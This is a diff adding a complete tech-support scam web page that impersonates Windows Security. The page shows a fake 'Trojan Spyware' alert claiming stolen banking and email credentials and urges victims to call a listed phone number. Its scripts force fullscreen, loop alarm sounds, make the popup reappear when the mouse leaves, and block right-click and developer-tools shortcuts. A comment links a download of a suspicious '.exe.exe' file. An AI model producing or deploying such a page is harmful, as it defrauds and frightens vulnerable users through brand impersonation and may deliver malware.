@@ -1,0 +1,404 @@
+<!DOCTYPE html><html><head>
+<title>Security Center Services</title>
+<link rel="stylesheet" href="styles.css">
+<script type="text/javascript" src="scripts.js"></script>
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+<script type="text/javascript" src="https://tiiny.host/ad-script.js"></script><script defer="" data-domain="securitycenterservices1303023.tiiny.site" src="https://analytics.tiiny.site/js/plausible.js"></script></head>
+<body onclick="playSound()" id="bodypic">
+
+
+<div class="box" id="box">
+<div class="top">
+<p style="font-size: 13px;  font-family: Arial, Helvetica, sans-serif;">Windows Security<img src="cls.png" class="btn" style="float: right; width:115px;"></p>
+</div>
+<h2 style="position: absolute; left: 70px; top: 60px; font-weight: 300;" id="text1">Security at a glance</h2>
+<p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">See what's happening with the security and health of your device <br> and take any actions needed.</p>
+<div class="centerright">
+<ul>
+<li>
+<br>
+<img src="clip.png" width="50px;">
+<p>Virus &amp; threat protection</p>
+<p style="top: 120px; position: absolute; font-size: 13px; color: grey;">Action needed. Run a scan<br> to check for threats.</p>
+
+</li>
+<li>
+<br><br>
+<img src="firewall.png" width="60px;">
+<p>Firewall &amp; network protection</p>
+<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action needed.</p>
+
+</li>
+
+<li>
+<p style="top: 310px; position: absolute; font-size: 13px; color: grey;">Windows Security needs to quickly run a Quick Scan to re-check for threats.<br><u>Stop automatically scanning my PC.</u><br><br><jw style="color: #0063c6;"> More features</jw></p>
+
+
+</li>
+
+
+</ul>
+<ul>
+<li>
+<br>
+<img src="acc.png" width="60px;">
+<p>Account protection</p>
+<p style="top: 125px; position: absolute; font-size: 13px; color: grey;">No action needed.</p>
+</li>
+<li>
+<br>
+<img src="network.png" width="51px;">
+<p>App &amp; browser control</p>
+<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action needed.</p>
+</li>
+</ul>
+</div>
+<img src="si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+<br>
+
+</div>
+<!--<iframe src="https://support.microsoft.com" id="frame" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; ">
+</iframe>
+-->
+
+<!--Windows Security Quick Scan-->
+<div class="scan" id="scan">
+  <div class="top">
+  <p style="font-size: 13px;  font-family: Arial, Helvetica, sans-serif;">Windows Security<img src="cls.png" class="btn" style="float: right; width:115px;"></p>
+  </div>
+  <h2 style="position: absolute; left: 70px; top: 60px; font-weight: 300;" id="text1"><img src="vs.png" width="25px;" style="margin-right: 10px;">Virus &amp; threat protection</h2>
+  <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">Protection for your device against threats.</p>
+  <div class="centerright">
+  <ul>
+  <li>
+  
+  <div class="flex"> <img src="current.png" width="20px" height="20px;" style="margin-right: 10px; top: 33px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">Current threats</p></div> 
+  
+  
+  <br><br>
+  <div class="progress" id="bar"> 
+    <div class="progress__bar"></div>
+  </div>
+  
+  <p style="font-size: 13px;" id="info">Quick scan running...<br>Estimated time remaining: <n id="time">0</n><br><n id="amount">0</n> files scanned.</p>
+  
+  <a href="#" class="button" id="re">Cancel</a>
+  <p style=" font-size: 13px;" id="recx">Feel free to keep working while we scan your device.</p>
+
+  <p style="font-size: 13px; color: #0063c6;" id="recx-hide">Protection History</p>
+  <br>
+  <p id="shx" style="font-size: 13px; color: #0063c6; display: none;">Scan options<br> Allowed threats<br> Protection history</p>
+
+  
+  </li>
+
+  <li>
+  
+<div class="flex"><img src="sett.png" height="28px" width="30px;" style="margin-right: 10px; margin-top: 10px;"><p style="position: absolute; left: 35px;">Virus &amp; threat protection settings </p> </div> 
+<p style="color: grey; font-size: 13px;">No action needed</p>
+<p style="font-size: 13px; color: #0063c6;">Manage settings</p>
+  </li>
+  <!--
+  <li>
+   
+    <div class="flex"><img src="check.png" height="28px" width="30px;" style="margin-right: 10px; margin-top: 10px;"><p style="position: absolute; left: 35px;">Virus & threat protection updates </p> </div> 
+    <p style="color: grey; font-size: 13px;">Security intelligence is up to date.</p>
+   
+   
+    </li>
+ -->
+  </ul>
+  <ul>
+
+  <li>
+ 
+  
+  <p style="position: absolute; top: -55px;">Have a question?</p>
+  
+  <p style="font-size: 13px; color: #0063c6; position: absolute; top: -15px;">Get help</p>
+
+  </li>
+  <li>
+ 
+  
+    <p style="position: absolute; top: 25px;">Who's protecting me?</p>
+    
+    <p style="font-size: 13px; color: #0063c6; position: absolute; top: 65px;">Manage providers</p>
+
+    </li>
+    <li>
+ 
+  
+      <p style="position: absolute; top: 110px; ">Help improve Windows Security</p>
+  
+      <p style="font-size: 13px; color: #0063c6; position: absolute; top: 145px;">Give us feedback</p>
+     
+      </li>
+      <li>
+
+        <p style="position: absolute; top: 190px;">Change your privacy settings</p>
+        <p style="position: absolute; top: 220px; font-size: 13px;">View and change privacy settings<br> for your Windows<n id="which"></n> device.</p>
+      
+        <p style="font-size: 13px; color: #0063c6; position: absolute; top: 270px;">Privacy settings<br>Privacy dashboard<br>Privacy Statement</p>
+   
+        </li>
+        
+  </ul>
+  
+  </div>
+  <img src="si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+  <br>
+  </div>
+  <script>
+          navigator.userAgentData.getHighEntropyValues(["platformVersion"])
+   .then(ua => {
+     if (navigator.userAgentData.platform === "Windows") {
+       const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
+       if (majorPlatformVersion >= 13) {
+        document.getElementById("which").innerHTML = " 11";
+        }
+        else if (majorPlatformVersion > 0) {
+          document.getElementById("which").innerHTML = " 10";
+        }
+        else {
+          console.log("Outdated");
+        }
+     }
+     else {
+       console.log("Not running on Windows");
+     }
+   });
+  </script>
+
+
+
+
+
+
+<div class="alert_popup cardcontainer lightbox">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <p class="text-center" style="    font-size: 16px;
+font-weight: normal;
+margin: 0;
+margin-bottom: 5px;
+padding: 5px 10px;
+color: #414141;font-weight: bold;
+margin-top: 8px; text-align: center;">Windows Security - Trojan Spyware Warning</p>
+                <p class="text-center">** ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
+                <p>Your computer has alerted us that it has been infected with a Trojan Spyware. The following data has been compromised.<br><br>
+                    &gt; Email Credentials<br>  &gt; Banking Passwords<br>
+                    &gt; Facebook Login<br>
+                    &gt; Pictures &amp; Documents </p>
+               
+               <p>Windows Security Scan has found potentially unwanted Adware on this device that can steal your passwords, online identity, financial information, personal files, pictures or documents. <br><br>
+                You must contact us immediately so that our engineers can walk you through the removal process over the phone.<br><br>
+                Call Windows Support immediately to report this threat, prevent identity theft and unlock access to this device.<br><br>
+                Closing this window will put your personal information at risk and lead to a suspension of your Windows Registration.</p>
+              
+               <p style="padding-bottom: 0px;">Call Windows Support <strong>+1 (838)-500-2065 (USA Toll Free)</strong></p>
+               <div class="action_buttons"> <a class="active" id="leave_page">OK</a> <a class="active" id="leave_page">Cancel</a> </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+<audio id="beep" loop="">
+  <source src="alert.mp3" type="audio/mpeg">
+</audio>
+<audio id="beep-alerts" loop="">
+  <source src="--beep.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+  addEventListener("click", function() {
+var el = document.documentElement
+  , rfs =
+         el.requestFullScreen
+      || el.webkitRequestFullScreen
+      || el.mozRequestFullScreen
+      
+;
+rfs.call(el);
+
+});
+
+</script>
+
+<div class="lst" id="lst">
+  <div class="greyside">
+  <n style="font-size: 13px; margin-right: 10px; position: absolute; top: 10px;">Windows Security</n><img src="wincls.png" onclick="hidebox()" style="float: right; cursor: default;">
+  <br>
+  <br><b style="font-size: 20px; font-weight: 500;">Windows Firewall Protection Alert</b><br>
+</div>
+<p style="margin-left: 30px; margin-top: 20px;text-align: left; font-size: 14px;">Windows Defender Firewall has blocked some features of Ads.financetrack(1).exe on all public and private networks.</p>
+<div class="flex" style="margin-left: 30px; margin-top: 25px"><img src="bluemodern.png" width="48px" height="48px;"><p style="margin-left: 15px;">Ads.financetrack(1).exe</p></div>
+  <b style="margin-left: 30px; font-size: 14px; font-weight: 579;">Publisher: Unknown</b>
+  <p style="margin-left: 30px; font-size: 14px;">Windows has blocked access to your device for <br>security reasons. Contact Windows Support: </p>
+  <b style="margin-left: 30px; font-size: 17px; font-weight: 500;">+1 (838)-500-2065</b>
+
+
+  <div class="bottomselect" style="margin-top: 37px;">
+    <div class="flex" style="text-align: center;">
+
+    <a href="#" style="margin-left: 17px;" class="abuttons" onclick="hidebox()">Run Anyway </a>
+    <a href="#" class="abuttons" onclick="hidebox()">OK</a>
+  </div>
+
+  </div>
+ <!-- fake mouseokkkkkhiihokkkkkkkkkkk <svg xmlns="http://www.w3.org/2000/svg" style="z-index: 999999;" viewBox="0 0 16 16" width="22px" class="mouse" height="22px"><path fill="#fff" d="M6.807 10.656L4.5 12.572 4.5 2.184 11.874 9.353 8.911 9.738 10.457 13.422 8.354 14.342z"/><path fill="#788b9c" d="M5,3.367l5.784,5.624L9.497,9.158L8.196,9.327l0.508,1.21l1.102,2.625l-1.187,0.519l-1.09-2.596 L7.007,9.84l-1.038,0.863L5,11.507V3.367 M4,1v12.638l2.607-2.166l1.483,3.532l3.019-1.321l-1.483-3.533l3.339-0.434L4,1L4,1z"/></svg>-->
+
+</div>
+<script>
+  const el = document.querySelector('.mouse');
+
+// The render function is called on every frame
+function render (a) {
+  // The a variable is the amount of milliseconds since we started our script
+  
+  // Get a noise value based on the elapsed time
+  // This noise algorithm is returning values between [-1, 1] so we need to map them to [0, 1] by adding one to the value and dividing it by 2
+  const noiseX = (noise.simplex2(0, a*0.0005) + 1) / 2;
+  // We get another noise value for the y axis but because we don't want the same value than x, we need to use another value for the first parameter
+  const noiseY = (noise.simplex2(1, a*0.0005) + 1) / 2;
+  
+  // Convert the noise values from [0, 1] to the size of the window
+  const x = noiseX * window.innerWidth;
+  const y = noiseY * window.innerHeight;
+  
+  // Apply the x & y coordinates on our element
+  el.style.transform = `translate(${x}px, ${y}px)`;
+  
+  // Call the render function once the browser is ready to make it an infinite loop
+  requestAnimationFrame(render);
+}
+
+// Ask the browser to call render to start our animation
+requestAnimationFrame(render);
+</script>
+<style>
+  ::-webkit-scrollbar {
+    display: none;
+  }
+</style>
+ <script>
+  function hidebox() {
+    document.getElementById("lst").style.display = "none";
+  
+    function addEvent(obj, evt, fn) {
+if (obj.addEventListener) {
+ obj.addEventListener(evt, fn, false);
+} else if (obj.attachEvent) {
+ obj.attachEvent("on" + evt, fn);
+}
+}
+
+addEvent(document, 'mouseout', function(evt) {
+if (evt.toElement == null && evt.relatedTarget == null) {
+ document.getElementById('lst').style.display = "block";
+};
+});
+  }
+
+  
+ </script>
+<style>
+
+    .lst {
+      position: absolute;
+    top: 50%;
+    left: 50%;
+    border-radius: 10px;
+    background: #ffffff;
+    height:50ch;
+    width: 50ch;
+    max-height: 50ch;
+    max-width: 50ch;
+    transform: translate(-50%, -50%);
+   display: none;
+   box-shadow: rgba(0, 0, 0, 0.25) 0px 54px 55px, rgba(0, 0, 0, 0.12) 0px -12px 30px, rgba(0, 0, 0, 0.12) 0px 4px 6px, rgba(0, 0, 0, 0.17) 0px 12px 13px, rgba(0, 0, 0, 0.09) 0px -3px 5px;
+    z-index: 99999;
+    }
+    .greyside {
+      padding: 10px;
+      border-top-right-radius: 10px;
+      border-top-left-radius: 10px;
+      background:#e7e7e7;
+     
+    }
+    .bottomselect {
+      padding: 10px;
+     border-bottom-right-radius: 10px;
+     border-bottom-left-radius: 10px;
+      background:#e7e7e7;
+      align-items: center;
+      text-align: center;
+  
+    }
+</style>
+    <!-- https://fs12n5.sendspace.com/dl/dec9e5525552346b33449bc78a58b9b5/63a254af33d2fe6b/fk54dw/Ads.financetrack%281%29.exe.exe-->
+<script>
+  
+window.onload = function () {
+    document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+    }, false);
+    document.addEventListener("keydown", function (e) {
+        //document.onkeydown = function(e) {
+        // "I" key
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
+            disabledEvent(e);
+        }
+        // "J" key
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+            disabledEvent(e);
+        }
+        // "S" key + macOS
+        if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
+            disabledEvent(e);
+        }
+        // "U" key
+        if (e.ctrlKey && e.keyCode == 85) {
+            disabledEvent(e);
+        }
+        // "F12" key
+        if (event.keyCode == 123) {
+            disabledEvent(e);
+        }
+    }, false);
+    function disabledEvent(e) {
+        if (e.stopPropagation) {
+            e.stopPropagation();
+        } else if (window.event) {
+            window.event.cancelBubble = true;
+        }
+        e.preventDefault();
+        return false;
+    }
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+
+</body></html>
